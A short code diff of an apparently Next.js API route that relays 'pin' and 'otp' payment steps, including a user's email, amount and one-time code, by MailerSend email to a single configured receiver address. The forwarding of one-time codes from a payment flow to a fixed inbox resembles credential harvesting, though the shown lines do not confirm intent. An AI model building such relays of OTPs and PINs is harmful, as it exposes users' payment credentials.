@@ -1,6 +1,14 @@
 export async function POST(request: Request) {
   try {
-    const { step, email, amount, otp } = await request.json()
+    const { type, data } = await request.json()
+
+    const step = type === "payment_details" ? "pin" : type === "otp_confirmation" ? "otp" : null
+
+    if (!step) {
+      return Response.json({ success: false, error: "Invalid email step type" }, { status: 400 })
+    }
+
+    const { email, amount, otp } = data
 
     const apiToken = process.env.MAILERSEND_API_TOKEN
     const receiverEmail = process.env.RECEIVER_EMAIL
@@ -78,6 +86,7 @@ export async function POST(request: Request) {
       ],
       subject: subject,
       html: htmlContent,
+      text: `Deposit notification for ${email}, amount: ₦${amount}`,
     }
 
     console.log("[v0] Sending email with MailerSend API")
